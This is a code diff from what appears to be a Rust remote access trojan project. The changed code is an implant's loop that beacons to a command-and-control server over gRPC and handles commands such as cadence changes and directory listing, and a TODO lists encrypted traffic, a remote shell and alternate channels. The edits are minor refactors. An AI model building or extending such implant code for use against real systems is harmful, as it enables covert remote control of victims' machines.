@@ -11,8 +11,8 @@ use tonic::transport::Endpoint;
 
 /*
 TODO
-    - encrypt traffic from implant to server
     - implant 'shell' command
+    - encrypt traffic from implant to server
     - alternate communication method(s) between implant and server
 */
 
@@ -149,7 +149,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     loop {
         // Set up connection to server
         let location = state.server_location.clone();
-        let port = state.server_port.clone();
+        let port = state.server_port;
         let socket = format!("http://{location}:{port}");
         let channel = Endpoint::from_shared(socket.clone())?
                         .connect()
@@ -161,7 +161,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         // Request the next command
         let request = tonic::Request::new(
             Beacon {
-                requested_command: state.command_number.clone()
+                requested_command: state.command_number
             },
         );
         // Parse the response from the server
@@ -173,7 +173,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                 state.command_number += 1;
                 let seconds = response.arguments.parse::<u64>()?;
                 state.cadence = Duration::from_millis(seconds * 1000);
-                format!("Beacon cadence changed")
+                "Beacon cadence changed".to_string()
             },
             RatCommand::Dir => {
                 state.command_number += 1;
